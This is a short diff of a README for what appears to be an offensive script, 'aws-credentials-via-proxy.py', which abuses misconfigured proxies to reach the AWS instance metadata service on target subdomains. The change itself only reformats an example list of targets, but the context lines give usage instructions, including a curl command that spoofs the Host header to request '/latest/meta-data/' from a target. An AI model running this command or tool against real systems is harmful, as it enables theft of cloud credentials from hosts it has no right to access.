@@ -12,8 +12,8 @@ So we can modify the proxy by passing aws metadata url to the header and get aws
 ### How to run?
 - Pass a file(full path) with target subdomains
     - file format without http or https protocol: \
-    ```line 1: stage.abc.com 
-       line 2: beta-stage.abc.com```
+    ``` line 1: stage.abc.com 
+        line 2: beta-stage.abc.com ```
 - Run: `python aws-credentials-via-proxy.py C:\Users\Nitin\Documents\github\subdomains.txt`
 
 If you have fewer or one target, run - `curl -ik -H "Host:aws.ca.fi" http://target.com/latest/meta-data/`
